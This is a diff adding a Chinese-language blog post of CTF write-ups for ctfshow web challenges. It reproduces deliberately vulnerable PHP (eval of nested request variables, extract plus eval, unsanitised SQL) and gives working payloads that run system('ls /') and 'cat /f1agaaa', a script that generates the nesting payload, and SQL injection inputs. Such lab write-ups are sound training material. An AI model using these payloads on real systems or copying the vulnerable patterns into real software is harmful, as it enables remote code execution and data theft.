@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="菜狗杯web签到123456789101112131415161718&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-11-10 17:20:38# @Last Modified by:   h1xa# @Last Modified time: 2022-11-11 09:38:59# @email: h1xa@ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow(web)">
+<meta property="og:url" content="http://example.com/2023/07/29/ctfshow-web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="菜狗杯web签到123456789101112131415161718&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-11-10 17:20:38# @Last Modified by:   h1xa# @Last Modified time: 2022-11-11 09:38:59# @email: h1xa@ctf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161126553.png?raw=true">
+<meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161351928.png?raw=true">
+<meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161420515.png?raw=true">
+<meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161502774.png?raw=true">
+<meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729162920083.png?raw=true">
+<meta property="article:published_time" content="2023-07-29T07:25:16.000Z">
+<meta property="article:modified_time" content="2023-08-02T04:57:44.194Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161126553.png?raw=true">
+
+<link rel="canonical" href="http://example.com/2023/07/29/ctfshow-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ctfshow(web) | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/ctfshow-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow(web)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-07-29 15:25:16" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-02 12:57:44" itemprop="dateModified" datetime="2023-08-02T12:57:44+08:00">2023-08-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="菜狗杯"><a href="#菜狗杯" class="headerlink" title="菜狗杯"></a>菜狗杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 09:38:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>假如<code>cookie</code>传入<code>CTFshow-QQ群：=a</code> ,<code>$_POST[a]</code> ,令<code>a=b</code>,则<code>$_GET[b]</code>,令b&#x3D;c,则<code>$_REQUEST[c]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST[c][6][0][7][5][8][0][9][4][4]，其中$_REQUEST是以任何一种方式请求都可以，c为数组，$_REQUEST请求中传入的值是取的C数组中ID键为[6][0][7][5][8][0][9][4][4]的值。因为PHP数组是可以指定ID键分配值的，那么我们就可以给C数组中的这些键直接赋值：c[6][0][7][5][8][0][9][4][4]= system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>注意 传入cookie值<code>群</code>要用URL编码</p>
+<p>pyload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161126553.png?raw=true" alt="image-20230729161126553"></p>
+<p>查看f1agaaa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>查看源代码</p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161351928.png?raw=true" alt="image-20230729161351928"></p>
+<p>给出一般的flag，剩下的提示在控制台</p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161420515.png?raw=true" alt="image-20230729161420515"></p>
+<p>提示运行<code>g1ve_flag()</code></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161502774.png?raw=true" alt="image-20230729161502774"></p>
+<p><code>ctfshow&#123;We1c0me_t0_jo1n_u3_!&#125;</code></p>
+<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment"># 将post上来的数据直接都解析成变量的形式，在代码中可以直接使用</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="comment">//变量嵌套</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>同样是个嵌套，原理同第一题，但是嵌套了35次，</p>
+<p>写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters</span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_=a&#x27;</span>,end=<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">list</span>[i]&#125;</span>=<span class="subst">&#123;<span class="built_in">list</span>[i+<span class="number">1</span>]&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i=<span class="number">33</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">list</span>[i+<span class="number">1</span>]&#125;</span>=<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729162920083.png?raw=true" alt="image-20230729162920083"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另外再贴一下官方的wp</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="built_in">str</span>=<span class="string">&quot;_=__&quot;</span>;</span><br><span class="line">$res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;_=__&amp;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">34</span>; $i++) &#123; </span><br><span class="line">        $<span class="built_in">str</span>=<span class="string">&quot;_&quot;</span>.$<span class="built_in">str</span>.<span class="string">&quot;_&quot;</span>;</span><br><span class="line">        echo $<span class="built_in">str</span>.<span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($i==<span class="number">33</span>)&#123;</span><br><span class="line">                echo explode(<span class="string">&quot;=&quot;</span>, $<span class="built_in">str</span>)[<span class="number">1</span>].<span class="string">&quot;=eval(\$_GET[1]);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=__&amp;__=___&amp;___=____&amp;____=_____&amp;_____=______&amp;______=_______&amp;_______=________&amp;________=_________&amp;_________=__________&amp;__________=___________&amp;___________=____________&amp;____________=_____________&amp;_____________=______________&amp;______________=_______________&amp;_______________=________________&amp;________________=_________________&amp;_________________=__________________&amp;__________________=___________________&amp;___________________=____________________&amp;____________________=_____________________&amp;_____________________=______________________&amp;______________________=_______________________&amp;_______________________=________________________&amp;________________________=_________________________&amp;_________________________=__________________________&amp;__________________________=___________________________&amp;___________________________=____________________________&amp;____________________________=_____________________________&amp;_____________________________=______________________________&amp;______________________________=_______________________________&amp;_______________________________=________________________________&amp;________________________________=_________________________________&amp;_________________________________=__________________________________&amp;__________________________________=___________________________________&amp;___________________________________=____________________________________&amp;____________________________________=eval($_GET[1]);</span><br></pre></td></tr></table></figure>
+
+<p>官方的话使用<code>_</code>而不是使用字母，</p>
+<h1 id="萌新"><a href="#萌新" class="headerlink" title="萌新"></a>萌新</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
+
+
+
+<p>源码get传id，要求id不能大于999，还要等于1000</p>
+<p>pyload</p>
+<p><code>?id=~~1000</code>,</p>
+<h2 id="web1-web6"><a href="#web1-web6" class="headerlink" title="web1-web6"></a>web1-web6</h2><p>都可以此pyload</p>
+<p>但是都是非预期解</p>
+<p>预期解的话，在下一关的过滤中可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web1 :?id=100 or id=1000//就是用一个id小于999的来进行验证，然后再给他一个1000的值进行判断</span><br><span class="line">web2 ：相同的原理，直接为?id=100 ||id=1000</span><br><span class="line">web3 ：?id=100 ||id=1000</span><br><span class="line">web4 ：?id=100 ||id=1000</span><br><span class="line">web5 ：?id=~~1000</span><br><span class="line">web6 ：?id=~~1000</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web-7"><a href="#web-7" class="headerlink" title="web 7"></a>web 7</h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/29/buuctf-web/" rel="prev" title="buuctf(web)">
+      <i class="fa fa-chevron-left"></i> buuctf(web)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/31/CTF%E5%87%BA%E9%A2%98/" rel="next" title="CTF出题">
+      CTF出题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">菜狗杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">web签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-c0me-t0-s1gn"><span class="nav-number">1.2.</span> <span class="nav-text">web2 c0me_t0_s1gn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E7%9C%BC%E9%87%8C%E5%8F%AA%E6%9C%89"><span class="nav-number">1.3.</span> <span class="nav-text">我的眼里只有$</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%8C%E6%96%B0"><span class="nav-number">2.</span> <span class="nav-text">萌新</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web-1"><span class="nav-number">2.1.</span> <span class="nav-text">web 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-web6"><span class="nav-number">2.2.</span> <span class="nav-text">web1-web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-7"><span class="nav-number">2.3.</span> <span class="nav-text">web 7</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
